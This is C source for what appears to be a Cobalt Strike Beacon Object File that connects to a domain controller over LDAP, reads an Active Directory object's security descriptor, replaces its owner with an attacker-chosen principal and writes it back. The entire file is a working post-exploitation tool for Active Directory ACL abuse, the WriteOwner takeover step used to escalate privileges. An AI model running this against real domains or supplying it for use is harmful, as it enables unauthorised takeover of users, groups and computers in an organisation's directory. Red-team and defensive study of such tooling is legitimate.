#include <windows.h>
#include "../../_include/beacon.h"
#include "../common/ldap_common.c"
#include "../common/acl_common.c"

DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    // Parse arguments: target_identifier, is_target_dn, owner_identifier, is_owner_dn, search_ou, dc_address, use_ldaps
    char* targetIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTargetDN = BeaconDataInt(&parser);
    char* ownerIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isOwnerDN = BeaconDataInt(&parser);
    char* searchOu = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);

    if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
        return;
    }

    if (!ownerIdentifier || MSVCRT$strlen(ownerIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Owner identifier is required");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting set owner operation");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] New owner: %s %s", ownerIdentifier, isOwnerDN ? "(DN)" : "(name)");

    // Initialize LDAP connection
    char* dcHostname = NULL;
    LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
        return;
    }

    // Get default naming context
    char* defaultNC = NULL;
    if (!isTargetDN || !isOwnerDN) {
        defaultNC = GetDefaultNamingContext(ld, dcHostname);
        if (!defaultNC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
    }

    // Resolve target DN
    char* targetDN = NULL;
    if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetIdentifier) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) {
            MSVCRT$strcpy(targetDN, targetIdentifier);
        }
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
        if (!targetDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
            if (defaultNC) MSVCRT$free(defaultNC);
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target DN: %s", targetDN);
    }

    // Resolve owner DN and get SID
    char* ownerDN = NULL;
    PSID ownerSid = NULL;
    
    if (isOwnerDN) {
        size_t len = MSVCRT$strlen(ownerIdentifier) + 1;
        ownerDN = (char*)MSVCRT$malloc(len);
        if (ownerDN) {
            MSVCRT$strcpy(ownerDN, ownerIdentifier);
        }
    } else {
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        ownerDN = FindObjectDN(ld, ownerIdentifier, searchBase);
        if (!ownerDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Owner '%s' not found", ownerIdentifier);
            MSVCRT$free(targetDN);
            if (defaultNC) MSVCRT$free(defaultNC);
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner DN: %s", ownerDN);
    }

    // Get the SID of the new owner
    ownerSid = GetObjectSid(ld, ownerDN);
    if (!ownerSid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve owner SID");
        MSVCRT$free(targetDN);
        if (ownerDN) MSVCRT$free(ownerDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Convert SID to string for display
    char* ownerSidStr = SidToString(ownerSid);
    if (ownerSidStr) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner SID: %s", ownerSidStr);
        MSVCRT$free(ownerSidStr);
    }

    // Read current security descriptor
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reading current security descriptor...");
    BERVAL* sdBerval = ReadSecurityDescriptor(ld, targetDN);
    if (!sdBerval) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor");
        MSVCRT$free(ownerSid);
        MSVCRT$free(targetDN);
        if (ownerDN) MSVCRT$free(ownerDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Convert to absolute format for modification
    PSECURITY_DESCRIPTOR pSD = ConvertBervalToSecurityDescriptor(sdBerval);
    if (!pSD) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to absolute format");
        MSVCRT$free(sdBerval->bv_val);
        MSVCRT$free(sdBerval);
        MSVCRT$free(ownerSid);
        MSVCRT$free(targetDN);
        if (ownerDN) MSVCRT$free(ownerDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Free the original BERVAL as we now have an absolute SD
    MSVCRT$free(sdBerval->bv_val);
    MSVCRT$free(sdBerval);

    // Set the new owner
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Setting new owner...");
    if (!ADVAPI32$SetSecurityDescriptorOwner(pSD, ownerSid, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set security descriptor owner");
        MSVCRT$free(pSD);
        MSVCRT$free(ownerSid);
        MSVCRT$free(targetDN);
        if (ownerDN) MSVCRT$free(ownerDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Convert back to self-relative format for writing
    BERVAL* newSdBerval = ConvertSecurityDescriptorToBerval(pSD);
    if (!newSdBerval) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to self-relative format");
        MSVCRT$free(pSD);
        MSVCRT$free(ownerSid);
        MSVCRT$free(targetDN);
        if (ownerDN) MSVCRT$free(ownerDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        if (dcHostname) MSVCRT$free(dcHostname);
        CleanupLDAP(ld);
        return;
    }

    // Write the modified security descriptor back
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing modified security descriptor...");
    BOOL success = WriteSecurityDescriptor(ld, targetDN, newSdBerval);

    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set owner");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %s", targetDN);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] New owner: %s", ownerDN ? ownerDN : ownerIdentifier);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to write security descriptor");
        BeaconPrintf(CALLBACK_ERROR, "[!] Note: WriteOwner permission or administrative rights required");
    }

    // Cleanup
    MSVCRT$free(newSdBerval->bv_val);
    MSVCRT$free(newSdBerval);
    MSVCRT$free(pSD);
    MSVCRT$free(ownerSid);
    MSVCRT$free(targetDN);
    if (ownerDN) MSVCRT$free(ownerDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    if (dcHostname) MSVCRT$free(dcHostname);
    CleanupLDAP(ld);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Operation complete");
}